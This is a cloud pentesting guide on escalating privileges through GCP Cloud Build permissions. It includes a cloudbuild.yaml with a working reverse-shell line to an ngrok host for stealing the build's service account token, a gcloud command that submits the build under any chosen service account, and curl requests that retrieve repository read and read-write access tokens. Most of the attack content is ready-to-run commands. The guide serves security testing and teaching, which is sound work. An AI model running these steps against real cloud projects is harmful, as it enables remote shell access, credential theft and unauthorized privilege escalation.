### `cloudbuild.builds.create`, `iam.serviceAccounts.actAs`

With this permission you can **submit a cloud build**. The cloudbuild machine will have in itâ€™s filesystem by **default a token of the cloudbuild Service Account**: `<PROJECT_NUMBER>@cloudbuild.gserviceaccount.com`. However, you can **indicate any service account inside the project** in the cloudbuild configuration.\
Therefore, you can just make the machine exfiltrate to your server the token or **get a reverse shell inside of it and get yourself the token** (the file containing the token might change).

#### Direct exploitation via gcloud CLI

1- Create `cloudbuild.yaml` and modify with your listener data
```yaml
steps:
  - name: bash
    script: |
      #!/usr/bin/env bash
      bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/14965 0>&1
options:
  logging: CLOUD_LOGGING_ONLY
```
2- Upload a simple build with no source, the yaml file and specify the SA to use on the build:
```bash
gcloud builds submit --no-source --config="./cloudbuild.yaml" --service-account="projects/<PROJECT>/serviceAccounts/<SERVICE_ACCOUNT_ID>@<PROJECT_ID>.iam.gserviceaccount.com
```

#### Using python gcloud library
You can find the original exploit script [**here on GitHub**](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudbuild.builds.create.py) (but the location it's taking the token from didn't work for me). Therefore, check a script to automate the [**creation, exploit and cleaning of a vuln environment here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/f-cloudbuild.builds.create.sh) and a python script to get a reverse shell inside the cloudbuild machine and [**steal it here**](https://github.com/carlospolop/gcp_privesc_scripts/blob/main/tests/f-cloudbuild.builds.create.py) (in the code you can find how to specify other service accounts)**.**

### `cloudbuild.builds.update`

**Potentially** with this permission you will be able to **update a cloud build and just steal the service account token** like it was performed with the previous permission (but unfortunately at the time of this writing I couldn't find any way to call that API).

### `cloudbuild.repositories.accessReadToken`

With this permission the user can get the **read access token** used to access the repository:

```bash
curl -X POST \
     -H "Authorization: Bearer $(gcloud auth print-access-token)" \
     -H "Content-Type: application/json" \
     -d '{}' \
     "https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>/repositories/<repo-id>:accessReadToken"
```

### `cloudbuild.repositories.accessReadWriteToken`

With this permission the user can get the **read and write access token** used to access the repository:

```bash
curl -X POST \
     -H "Authorization: Bearer $(gcloud auth print-access-token)" \
     -H "Content-Type: application/json" \
     -d '{}' \
     "https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>/repositories/<repo-id>:accessReadWriteToken"
```

### `cloudbuild.connections.fetchLinkableRepositories`

With this permission you can **get the repos the connection has access to:**

```bash
curl -X GET \
     -H "Authorization: Bearer $(gcloud auth print-access-token)" \
     "https://cloudbuild.googleapis.com/v2/projects/<PROJECT_ID>/locations/<LOCATION>/connections/<CONN_ID>:fetchLinkableRepositories"
```
